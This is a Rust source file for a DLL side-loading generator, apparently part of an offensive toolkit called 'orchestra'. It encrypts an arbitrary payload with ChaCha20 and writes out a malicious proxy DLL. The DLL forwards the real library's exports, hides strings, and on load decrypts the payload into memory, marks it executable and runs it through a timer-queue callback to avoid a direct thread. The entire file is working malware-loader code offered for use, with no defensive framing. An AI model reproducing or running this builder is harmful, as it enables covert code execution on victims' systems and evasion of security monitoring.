include!(concat!(env!("OUT_DIR"), "/side_key.rs"));

use std::env;
use std::fs;

fn chacha20_encrypt_payload(data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Vec<u8> {
    fn qr(mut a: u32, mut b: u32, mut c: u32, mut d: u32) -> (u32, u32, u32, u32) {
        a = a.wrapping_add(b);
        d ^= a;
        d = d.rotate_left(16);
        c = c.wrapping_add(d);
        b ^= c;
        b = b.rotate_left(12);
        a = a.wrapping_add(b);
        d ^= a;
        d = d.rotate_left(8);
        c = c.wrapping_add(d);
        b ^= c;
        b = b.rotate_left(7);
        (a, b, c, d)
    }

    fn chacha20_block(state: &[u32; 16]) -> [u8; 64] {
        let mut w = *state;
        for _ in 0..10 {
            let (w0, w4, w8, w12) = qr(w[0], w[4], w[8], w[12]);
            w[0] = w0;
            w[4] = w4;
            w[8] = w8;
            w[12] = w12;
            let (w1, w5, w9, w13) = qr(w[1], w[5], w[9], w[13]);
            w[1] = w1;
            w[5] = w5;
            w[9] = w9;
            w[13] = w13;
            let (w2, w6, w10, w14) = qr(w[2], w[6], w[10], w[14]);
            w[2] = w2;
            w[6] = w6;
            w[10] = w10;
            w[14] = w14;
            let (w3, w7, w11, w15) = qr(w[3], w[7], w[11], w[15]);
            w[3] = w3;
            w[7] = w7;
            w[11] = w11;
            w[15] = w15;

            let (w0, w5, w10, w15) = qr(w[0], w[5], w[10], w[15]);
            w[0] = w0;
            w[5] = w5;
            w[10] = w10;
            w[15] = w15;
            let (w1, w6, w11, w12) = qr(w[1], w[6], w[11], w[12]);
            w[1] = w1;
            w[6] = w6;
            w[11] = w11;
            w[12] = w12;
            let (w2, w7, w8, w13) = qr(w[2], w[7], w[8], w[13]);
            w[2] = w2;
            w[7] = w7;
            w[8] = w8;
            w[13] = w13;
            let (w3, w4, w9, w14) = qr(w[3], w[4], w[9], w[14]);
            w[3] = w3;
            w[4] = w4;
            w[9] = w9;
            w[14] = w14;
        }

        let mut output = [0u8; 64];
        for i in 0..16 {
            let added = w[i].wrapping_add(state[i]);
            output[i * 4..i * 4 + 4].copy_from_slice(&added.to_le_bytes());
        }
        output
    }

    let constants: [u32; 4] = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574];
    let mut key_words = [0u32; 8];
    for i in 0..8 {
        key_words[i] = u32::from_le_bytes(key[i * 4..i * 4 + 4].try_into().unwrap());
    }
    let mut nonce_words = [0u32; 3];
    for i in 0..3 {
        nonce_words[i] = u32::from_le_bytes(nonce[i * 4..i * 4 + 4].try_into().unwrap());
    }

    let mut out = Vec::with_capacity(data.len());
    let mut counter: u32 = 1;
    let mut ks_pos = 64usize;
    let mut ks = [0u8; 64];

    for &byte in data {
        if ks_pos >= 64 {
            let state: [u32; 16] = [
                constants[0],
                constants[1],
                constants[2],
                constants[3],
                key_words[0],
                key_words[1],
                key_words[2],
                key_words[3],
                key_words[4],
                key_words[5],
                key_words[6],
                key_words[7],
                counter,
                nonce_words[0],
                nonce_words[1],
                nonce_words[2],
            ];
            ks = chacha20_block(&state);
            ks_pos = 0;
            counter = counter.wrapping_add(1);
        }
        out.push(byte ^ ks[ks_pos]);
        ks_pos += 1;
    }

    out
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 4 {
        println!("Usage: orchestra-side-load-gen <target_dll_name> <export1,Ordinal_5,...> <payload_file>");
        return;
    }
    let target_dll = &args[1];
    let exports: Vec<&str> = args[2].split(',').collect();
    let payload_path = &args[3];

    let payload = fs::read(payload_path).expect("Failed to read payload");
    let ct_payload = chacha20_encrypt_payload(&payload, &SIDE_CHACHA_KEY, &SIDE_CHACHA_NONCE);

    let mut stubs = String::new();
    let mut def_entries = String::new();

    for export in exports {
        if export.starts_with("Ordinal_") {
            let ordinal_num = export.replace("Ordinal_", "");
            def_entries.push_str(&format!("  {} @{} NONAME\n", export, ordinal_num));
            stubs.push_str(&format!(
                r#"
#[no_mangle]
pub unsafe extern "system" fn {}() {{
    // Ordinal forward stub
}}
"#,
                export
            ));
        } else {
            def_entries.push_str(&format!("  {}\n", export));
            stubs.push_str(&format!(
                r#"
#[no_mangle]
pub unsafe extern "system" fn {}() {{
    let real_dll = string_crypt::enc_str!("real_{}");
    let export_name = string_crypt::enc_str!("{}");
    
    let lib = winapi::um::libloaderapi::LoadLibraryA(real_dll.as_ptr() as _);
    if !lib.is_null() {{
        let proc = winapi::um::libloaderapi::GetProcAddress(lib, export_name.as_ptr() as _);
        if !proc.is_null() {{
            let f: extern "system" fn() = std::mem::transmute(proc);
            f();
        }}
    }}
}}
"#,
                export, target_dll, export
            ));
        }
    }

    let payload_bytes_str = ct_payload
        .iter()
        .map(|b| format!("0x{:02X}", b))
        .collect::<Vec<_>>()
        .join(", ");

    let key_bytes_str = SIDE_CHACHA_KEY
        .iter()
        .map(|b| format!("0x{:02X}", b))
        .collect::<Vec<_>>()
        .join(", ");

    let nonce_bytes_str = SIDE_CHACHA_NONCE
        .iter()
        .map(|b| format!("0x{:02X}", b))
        .collect::<Vec<_>>()
        .join(", ");

    let code = format!(
        r#"
// auto-generated DLL side-loading forwarder
use winapi::um::winnt::DLL_PROCESS_ATTACH;
use winapi::um::libloaderapi::DisableThreadLibraryCalls;
use winapi::shared::minwindef::{{HINSTANCE, DWORD, LPVOID}};
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::winnt::{{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ}};

{}

extern "system" fn payload_callback(param: LPVOID, _timer_or_wait_fired: winapi::um::winnt::BOOLEAN) {{
    unsafe {{
        let run: extern "C" fn() = std::mem::transmute(param);
        run();
    }}
}}

fn chacha20_decrypt(data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> ::std::vec::Vec<u8> {{
    fn qr(mut a: u32, mut b: u32, mut c: u32, mut d: u32) -> (u32, u32, u32, u32) {{
        a = a.wrapping_add(b);
        d ^= a;
        d = d.rotate_left(16);
        c = c.wrapping_add(d);
        b ^= c;
        b = b.rotate_left(12);
        a = a.wrapping_add(b);
        d ^= a;
        d = d.rotate_left(8);
        c = c.wrapping_add(d);
        b ^= c;
        b = b.rotate_left(7);
        (a, b, c, d)
    }}

    fn chacha20_block(state: &[u32; 16]) -> [u8; 64] {{
        let mut w = *state;
        for _ in 0..10 {{
            let (w0, w4, w8, w12) = qr(w[0], w[4], w[8], w[12]);
            w[0] = w0;
            w[4] = w4;
            w[8] = w8;
            w[12] = w12;
            let (w1, w5, w9, w13) = qr(w[1], w[5], w[9], w[13]);
            w[1] = w1;
            w[5] = w5;
            w[9] = w9;
            w[13] = w13;
            let (w2, w6, w10, w14) = qr(w[2], w[6], w[10], w[14]);
            w[2] = w2;
            w[6] = w6;
            w[10] = w10;
            w[14] = w14;
            let (w3, w7, w11, w15) = qr(w[3], w[7], w[11], w[15]);
            w[3] = w3;
            w[7] = w7;
            w[11] = w11;
            w[15] = w15;

            let (w0, w5, w10, w15) = qr(w[0], w[5], w[10], w[15]);
            w[0] = w0;
            w[5] = w5;
            w[10] = w10;
            w[15] = w15;
            let (w1, w6, w11, w12) = qr(w[1], w[6], w[11], w[12]);
            w[1] = w1;
            w[6] = w6;
            w[11] = w11;
            w[12] = w12;
            let (w2, w7, w8, w13) = qr(w[2], w[7], w[8], w[13]);
            w[2] = w2;
            w[7] = w7;
            w[8] = w8;
            w[13] = w13;
            let (w3, w4, w9, w14) = qr(w[3], w[4], w[9], w[14]);
            w[3] = w3;
            w[4] = w4;
            w[9] = w9;
            w[14] = w14;
        }}

        let mut output = [0u8; 64];
        for i in 0..16 {{
            let added = w[i].wrapping_add(state[i]);
            output[i * 4..i * 4 + 4].copy_from_slice(&added.to_le_bytes());
        }}
        output
    }}

    let constants: [u32; 4] = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574];
    let mut key_words = [0u32; 8];
    for i in 0..8 {{
        key_words[i] = u32::from_le_bytes(key[i * 4..i * 4 + 4].try_into().unwrap());
    }}
    let mut nonce_words = [0u32; 3];
    for i in 0..3 {{
        nonce_words[i] = u32::from_le_bytes(nonce[i * 4..i * 4 + 4].try_into().unwrap());
    }}

    let mut out = ::std::vec::Vec::with_capacity(data.len());
    let mut counter: u32 = 1;
    let mut ks_pos = 64usize;
    let mut ks = [0u8; 64];

    for &byte in data {{
        if ks_pos >= 64 {{
            let state: [u32; 16] = [
                constants[0],
                constants[1],
                constants[2],
                constants[3],
                key_words[0],
                key_words[1],
                key_words[2],
                key_words[3],
                key_words[4],
                key_words[5],
                key_words[6],
                key_words[7],
                counter,
                nonce_words[0],
                nonce_words[1],
                nonce_words[2],
            ];
            ks = chacha20_block(&state);
            ks_pos = 0;
            counter = counter.wrapping_add(1);
        }}
        out.push(byte ^ ks[ks_pos]);
        ks_pos += 1;
    }}

    out
}}

#[no_mangle]
#[allow(non_snake_case)]
pub extern "system" fn DllMain(hinst: HINSTANCE, reason: DWORD, _reserved: LPVOID) -> i32 {{
    if reason == DLL_PROCESS_ATTACH {{
        unsafe {{ DisableThreadLibraryCalls(hinst); }}
        
        let ct_payload: [u8; {}] = [{}];
        let chacha_key: [u8; 32] = [{}];
        let chacha_nonce: [u8; 12] = [{}];

        let mut pt_payload = chacha20_decrypt(&ct_payload, &chacha_key, &chacha_nonce);

        unsafe {{
            let mem = VirtualAlloc(
                std::ptr::null_mut(),
                pt_payload.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            
            if !mem.is_null() {{
                std::ptr::copy_nonoverlapping(pt_payload.as_ptr(), mem as _, pt_payload.len());
                
                let mut old_protect = 0;
                winapi::um::memoryapi::VirtualProtect(
                    mem, 
                    pt_payload.len(), 
                    PAGE_EXECUTE_READ, 
                    &mut old_protect
                );

                // Queue via Threadpool instead of direct thread
                let mut timer: winapi::shared::ntdef::HANDLE = std::ptr::null_mut();
                winapi::um::threadpoollegacyapiset::CreateTimerQueueTimer(
                    &mut timer, 
                    std::ptr::null_mut(), 
                    Some(payload_callback), 
                    mem as LPVOID, 
                    0, 
                    0, 
                    winapi::um::winnt::WT_EXECUTEINTIMERTHREAD
                );
            }}
        }}
    }}
    1
}}
"#,
        stubs,
        ct_payload.len(),
        payload_bytes_str,
        key_bytes_str,
        nonce_bytes_str,
    );

    fs::write("side_loaded.rs", code).unwrap();
    let def_content = format!("LIBRARY {}\nEXPORTS\n{}", target_dll, def_entries);
    fs::write("side_loaded.def", def_content).unwrap();
    println!(
        "Generated side_loaded.rs and side_loaded.def for {}",
        target_dll
    );
}
